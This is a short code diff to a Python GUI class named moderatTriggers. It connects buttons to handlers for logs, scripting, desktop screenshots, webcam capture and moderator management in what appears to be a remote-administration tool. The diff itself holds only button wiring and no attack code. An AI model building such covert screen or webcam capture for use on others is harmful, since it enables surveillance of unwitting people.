@@ -12,7 +12,7 @@ class moderatTriggers:
         self.moderat.disconnectButton.clicked.connect(self.moderat.on_moderator_connect_fail)
         #self.moderat.settingsButton.clicked.connect(self.moderat.run_settings)
 
-        # Menu Triggers
+        # Online Menu Triggers
         self.moderat.viewLogsButton.clicked.connect(self.moderat.view_logs)
         self.moderat.logSettingsButton.clicked.connect(self.moderat.set_logs_settings)
         self.moderat.setAliasButton.clicked.connect(self.moderat.set_alias)
@@ -22,4 +22,8 @@ class moderatTriggers:
         self.moderat.scriptingButton.clicked.connect(lambda: self.moderat.execute_module(module='scripting'))
         self.moderat.screenshotButton.clicked.connect(lambda: self.moderat.execute_module(module='desktop'))
         self.moderat.webcamButton.clicked.connect(lambda: self.moderat.execute_module(module='webcam'))
-        # self.moderat.setModeratorButton.clicked.connect(self.administrator_set_moderator)
+        self.moderat.setModeratorButton.clicked.connect(self.moderat.set_moderator)
+
+        # Moderators Menu Triggers
+        self.moderat.getModeratorsButton.clicked.connect(self.moderat.get_moderators)
+        self.moderat.addModeratorButton.clicked.connect(self.moderat.create_moderator)
